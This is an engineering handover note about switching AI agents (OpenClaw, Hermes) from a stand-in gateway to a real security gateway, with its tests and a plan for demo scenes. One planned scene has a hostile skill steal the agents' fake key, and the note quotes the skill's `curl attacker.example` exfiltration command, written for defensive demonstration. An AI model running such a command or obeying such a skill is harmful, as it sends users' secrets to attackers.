# Firewall → Agents: status after B's restructure

From A (firewall). Checked against B's `agents` branch at `a410372`. These files are yours (`agents/`, `compose.yaml`), so I haven't changed them.

## Done and verified

| Item | Where | How I checked |
|---|---|---|
| Fake key sent on MCP calls | `agents/openclaw/config.json`, `agents/hermes/config.json` (`headers.Authorization`) | Gateway logs name both agents on `tool_call`; no `tool_denied` lines |
| `permissions.json` with a fresh `run_id`, mounted at `/config/agents` | `agents/manager.py` `write_permissions`, `agents/gateway/compose.yaml` | `agents/test_manager.py` passes |
| User folders mounted into the gateway only, at `/data/folders/<name>` | `agents/manager.py` `gateway_folder_mounts` | Same test; agent composes mount no user folders |
| `label` on `FolderAccess` | `core/contracts/agents.py` | The gateway will read it in Step 1 |

## One change left: switch to the real gateway (needed now)

The real gateway now serves Gemini the same way your stand-in does, so it can replace it. In `agents/gateway/compose.yaml`, swap the `build` line for the one in your comment:

```yaml
  gateway:
    build: { context: ../.., dockerfile: images/gateway/Dockerfile }
```

Everything else in that file stays as it is (`env_file`, `HEIMDALL_FAKE_KEYS`, the `/config/agents` volume).

**Tested** (Nov 14, branch `firewall-gemini`): with exactly that one line changed, the whole suite passed, 53 tests. That covers all of your `agents/` tests, Docker included, for both OpenClaw and Hermes with a real `GEMINI_API_KEY`, plus the firewall's tests. The real Gemini key does not appear in the gateway logs.

What the real gateway does that your stand-in did:
- Same URLs (`/mcp`, `/model/*`, port 8080) and the same log lines (`model_call`, `model_forwarded`, `model_blocked`, `model_error`, `tool_call`).
- `chat/completions` goes to Gemini (with the thought-signature fix), and `messages` goes to Anthropic.
- 401 without a known fake key. MCP tool calls without a known key are refused.

What it adds:
- `HEIMDALL_PROVIDER=mock` in `.env` gives a scripted model in both API styles: an offline run that needs no key.
- Tool results are sent once. Without this, the SDK also sent a second, JSON copy that agents showed to the model.

After the switch, `agents/gateway/server.py` and `agents/gateway/Dockerfile` can be deleted.

## Later (no action yet)

- Firewall Step 4 (Gmail): mount `data/credentials.json` and `data/token.json` read-only into the gateway.
- Scene 4 (fake key stolen), with D: agents have no internet, so a skill's `curl attacker.example` just fails and nothing shows on the dashboard. The firewall will catch the fake key when it leaves through a gateway tool or a model request. If the demo also needs a visible "blocked" moment for raw network calls, we could add a small logger on `gateway:8081` that refuses every connection and logs the host. That would need `HTTPS_PROXY=http://gateway:8081` in the agent images. Let's decide together.

## How to check after the switch

```
uv run pytest -m "not docker"   # fast, no key needed
uv run pytest                   # full run; needs GEMINI_API_KEY in .env, about 5 minutes
```
